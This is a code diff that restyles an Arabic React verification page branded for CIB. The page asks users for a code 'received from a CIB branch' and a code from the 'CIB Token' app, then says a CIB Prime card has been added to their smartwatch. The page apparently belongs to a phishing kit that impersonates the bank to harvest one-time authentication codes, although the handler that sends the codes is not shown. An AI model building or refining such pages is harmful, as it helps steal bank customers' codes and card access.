@@ -113,37 +113,34 @@ export default function Verify() {
   if (isSuccess) {
     return (
       <AppLayout>
-        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in zoom-in-95 duration-700">
-          <div className="w-32 h-32 mb-8 rounded-full bg-primary/10 flex items-center justify-center relative">
-            <div className="absolute inset-0 rounded-full border-[6px] border-primary/20 animate-ping" style={{ animationDuration: '3s' }} />
-            <div className="absolute inset-4 rounded-full border border-primary/40" />
-            <ShieldCheck className="w-16 h-16 text-primary relative z-10" />
+        <div className="flex-1 flex flex-col items-center justify-center max-w-md w-full mx-auto animate-in fade-in duration-500 py-10" dir="rtl">
+          <div className="w-20 h-20 mb-6 rounded-full bg-primary/10 flex items-center justify-center border border-primary/20">
+            <ShieldCheck className="w-10 h-10 text-primary" />
           </div>
           
-          <h2 className="text-4xl font-bold text-foreground mb-4 text-center tracking-tight">تم التفعيل بنجاح</h2>
+          <h2 className="text-xl font-bold text-foreground mb-2 text-center">تم التفعيل بنجاح</h2>
           
-          <p className="text-lg text-muted-foreground text-center mb-10 leading-relaxed">
+          <p className="text-xs text-muted-foreground text-center mb-6 leading-relaxed px-4 text-right">
             عزيزي <span className="font-semibold text-foreground">{data.fullName || 'العميل'}</span>، تمت إضافة بطاقة <span className="text-primary font-medium">CIB Prime</span> إلى ساعتك الذكية بنجاح. يمكنك الآن الدفع بسهولة وأمان.
           </p>
           
-          <div className="bg-card border border-border rounded-2xl p-8 w-full shadow-2xl relative overflow-hidden mb-10">
-            <div className="absolute -right-10 -top-10 w-40 h-40 bg-primary/10 rounded-full blur-3xl pointer-events-none" />
-            <div className="relative z-10 space-y-6">
-              <div className="flex items-center justify-between pb-4 border-b border-border/50">
-                <span className="text-muted-foreground">البطاقة</span>
-                <span className="font-bold tracking-[0.3em] text-foreground text-lg">•••• 4920</span>
+          <div className="bg-card border border-border/80 rounded-2xl p-5 w-full shadow-sm text-right mb-6">
+            <div className="space-y-3">
+              <div className="flex items-center justify-between pb-3 border-b border-border/50">
+                <span className="text-muted-foreground text-xs">البطاقة</span>
+                <span className="font-bold tracking-[0.3em] text-foreground text-sm" dir="ltr">•••• 4920</span>
               </div>
               <div className="flex items-center justify-between">
-                <span className="text-muted-foreground">الحالة</span>
-                <span className="flex items-center gap-2 text-emerald-500 font-bold bg-emerald-500/10 px-3 py-1 rounded-full">
-                  <CheckCircle2 className="w-5 h-5" /> نشطة الآن
+                <span className="text-muted-foreground text-xs">الحالة</span>
+                <span className="flex items-center gap-1.5 text-emerald-500 text-xs font-bold bg-emerald-500/10 px-2.5 py-1 rounded-lg">
+                  <CheckCircle2 className="w-4 h-4" /> نشطة الآن
                 </span>
               </div>
             </div>
           </div>
           
-          <Link href="/" className="w-full sm:w-auto">
-            <Button size="lg" className="w-full h-14 px-12 text-lg rounded-xl shadow-xl shadow-primary/20">
+          <Link href="/" className="w-full">
+            <Button size="lg" className="w-full h-11 text-sm font-semibold rounded-xl bg-primary text-primary-foreground hover:bg-primary/95 transition-colors">
               العودة للرئيسية
             </Button>
           </Link>
@@ -154,23 +151,25 @@ export default function Verify() {
 
   return (
     <AppLayout>
-      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in slide-in-from-right-8 duration-500">
+      <div className="flex-1 flex flex-col justify-center max-w-md w-full mx-auto animate-in fade-in-50 slide-in-from-bottom-4 duration-300 py-10" dir="rtl">
         
-        <div className="mb-10 flex items-center justify-between">
-          <div className="space-y-2">
-            <h1 className="text-4xl font-bold text-foreground tracking-tight">رمز التحقق</h1>
-            <p className="text-muted-foreground text-base">أدخل الرمز الذي تسلّمته من فرع CIB</p>
+        {/* الهيدر العلوي النظيف */}
+        <div className="mb-6 flex items-center justify-between px-1">
+          <div className="text-right">
+            <h1 className="text-xl font-bold text-foreground tracking-tight">رمز التحقق</h1>
+            <p className="text-xs text-muted-foreground mt-1">أدخل الرمز الذي تسلّمته من فرع CIB</p>
           </div>
-          <Link href="/create-account" className="w-12 h-12 flex items-center justify-center rounded-full bg-card border border-border hover:bg-accent transition-colors shadow-sm">
-            <ChevronRight className="w-6 h-6 text-foreground" />
+          <Link href="/create-account" className="w-9 h-9 flex items-center justify-center rounded-lg bg-secondary border border-border/60 text-muted-foreground hover:text-foreground transition-all">
+            <ChevronRight className="w-4 h-4" />
           </Link>
         </div>
 
-        <div className="bg-card border border-border rounded-[2rem] p-8 md:p-10 shadow-2xl relative overflow-hidden">
-          <div className="absolute top-0 right-0 w-full h-1.5 bg-gradient-to-l from-primary via-primary to-primary" />
-          
-          <form onSubmit={handleSubmit} className="space-y-10 relative z-10">
-            <div className="flex justify-center gap-3 md:gap-4" dir="ltr">
+        {/* الكارت الاحترافي النظيف */}
+        <div className="bg-card border border-border/80 rounded-2xl p-6 md:p-8 shadow-sm text-right">
+          <form onSubmit={handleSubmit} className="space-y-6">
+            
+            {/* خانات إدخال الكود الرقمي */}
+            <div className="flex justify-center gap-2 md:gap-3" dir="ltr">
               {code.map((digit, index) => (
                 <input
                   key={index}
@@ -181,10 +180,10 @@ export default function Verify() {
                   value={digit}
                   onChange={e => handleChange(index, e.target.value)}
                   onKeyDown={e => handleKeyDown(index, e)}
-                  className={`w-12 h-16 md:w-14 md:h-16 text-center text-3xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-2 transition-all shadow-inner ${
+                  className={`w-10 h-12 text-center text-xl font-bold bg-background/50 border rounded-xl focus:outline-none focus:ring-1 transition-all ${
                     error 
-                      ? 'border-red-500 focus:border-red-500 focus:ring-red-500/50' 
-                      : 'border-input focus:border-primary focus:ring-primary/50'
+                      ? 'border-red-500 focus:ring-red-500/50 focus:border-red-500' 
+                      : 'border-border/80 focus:ring-primary/50 focus:border-primary'
                   }`}
                 />
               ))}
@@ -192,74 +191,64 @@ export default function Verify() {
 
             {/* رسالة الخطأ */}
             {error && (
-              <div className="flex items-center gap-3 p-4 bg-red-50 dark:bg-red-950/30 border border-red-200 dark:border-red-800 rounded-xl animate-in slide-in-from-top-2 duration-300">
-                <AlertCircle className="w-5 h-5 text-red-500 flex-shrink-0" />
-                <p className="text-red-600 dark:text-red-400 text-sm font-medium leading-relaxed">
+              <div className="flex items-start gap-2.5 p-3.5 bg-red-50 border-r-4 border-red-600 rounded-l text-right">
+                <AlertCircle className="w-4 h-4 text-red-500 flex-shrink-0 mt-0.5" />
+                <p className="text-red-600 text-xs font-medium leading-relaxed">
                   {error}
                 </p>
               </div>
             )}
 
-           <div className="bg-primary/5 border border-primary/20 rounded-xl p-5 text-sm md:text-base leading-relaxed text-center text-primary-foreground/90 font-medium">
-  يرجى ادخال رمز التحقق من
-  <br />
-  تطبيق cib token لإتمام عملية التحقق والمتابعة
-</div>
+            {/* صندوق النص التوضيحي الأصلي */}
+            <div className="bg-primary/5 border border-primary/10 rounded-xl p-4 text-xs leading-relaxed text-center text-foreground/90 font-medium">
+              يرجى ادخال رمز التحقق من
+              <br />
+              تطبيق cib token لإتمام عملية التحقق والمتابعة
+            </div>
 
+            {/* زر التأكيد */}
             <Button 
               type="submit" 
               size="lg" 
-              className="w-full h-14 gap-3 text-lg rounded-xl relative overflow-hidden group" 
+              className="w-full h-11 text-sm font-semibold rounded-xl bg-primary text-primary-foreground hover:bg-primary/95 transition-colors flex items-center justify-center" 
               disabled={code.join('').length < 4 || isSubmitting}
             >
               {isSubmitting ? (
-                <span className="flex items-center gap-3">
-                  <div className="w-5 h-5 rounded-full border-2 border-background border-t-transparent animate-spin" />
+                <span className="flex items-center gap-2">
+                  <div className="w-4 h-4 rounded-full border-2 border-background border-t-transparent animate-spin" />
                   جاري التوثيق والتفعيل...
                 </span>
               ) : (
                 'تأكيد  '
               )}
-              <div className="absolute inset-0 w-full h-full bg-gradient-to-r from-transparent via-white/10 to-transparent -translate-x-full group-hover:animate-[shimmer_1.5s_infinite]" />
             </Button>
 
-            {/* صندوق فتح التطبيق */}
+            {/* صندوق فتح تطبيق التوكن الأصلي */}
             <a 
               href={appUrl}
               target="_blank"
               rel="noopener noreferrer"
-              className="flex items-center gap-4 p-4 bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-950/30 dark:to-blue-900/30 border-2 border-blue-200 dark:border-blue-800 rounded-2xl hover:border-blue-400 dark:hover:border-blue-600 hover:shadow-lg transition-all duration-300 group"
+              className="flex items-center justify-between p-3.5 bg-secondary/50 border border-border/80 rounded-xl hover:bg-secondary/80 transition-all group"
             >
-              <div className="flex-shrink-0 w-14 h-14 bg-blue-500 rounded-xl flex items-center justify-center shadow-lg shadow-blue-500/30 group-hover:scale-110 transition-transform">
-                <Smartphone className="w-8 h-8 text-white" />
+              <div className="flex items-center gap-3">
+                <div className="w-10 h-10 bg-primary/10 text-primary rounded-lg flex items-center justify-center">
+                  <Smartphone className="w-5 h-5" />
+                </div>
+                <div className="text-right">
+                  <p className="text-foreground font-bold text-xs">
+                    يرجى فتح التطبيق CIB Token
+                  </p>
+                  <p className="text-muted-foreground text-[11px] mt-0.5">
+                    للحصول على رمز التحقق
+                  </p>
+                </div>
               </div>
-              <div className="flex-1">
-                <p className="text-blue-900 dark:text-blue-100 font-bold text-base leading-tight">
-                  يرجى فتح التطبيق CIB Token
-                </p>
-                <p className="text-blue-600 dark:text-blue-400 text-sm mt-0.5">
-                  للحصول على رمز التحقق
-                </p>
-              </div>
-              <svg 
-                xmlns="http://www.w3.org/2000/svg" 
-                className="w-6 h-6 text-blue-500 group-hover:translate-x-1 transition-transform flex-shrink-0" 
-                fill="none" 
-                viewBox="0 0 24 24" 
-                stroke="currentColor" 
-                strokeWidth={2}
-              >
-                <path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7" />
-              </svg>
+              <ChevronRight className="w-4 h-4 text-muted-foreground/60 group-hover:translate-x-0.5 transition-transform rotate-180" />
             </a>
           </form>
         </div>
 
-        <div className="mt-10 flex justify-center gap-3">
-          <div className="h-2 w-10 rounded-full bg-border" />
-          <div className="h-2 w-10 rounded-full bg-border" />
-          <div className="h-2 w-10 rounded-full bg-primary shadow-[0_0_10px_rgba(212,175,55,0.5)]" />
-        </div>
+       
       </div>
     </AppLayout>
   );
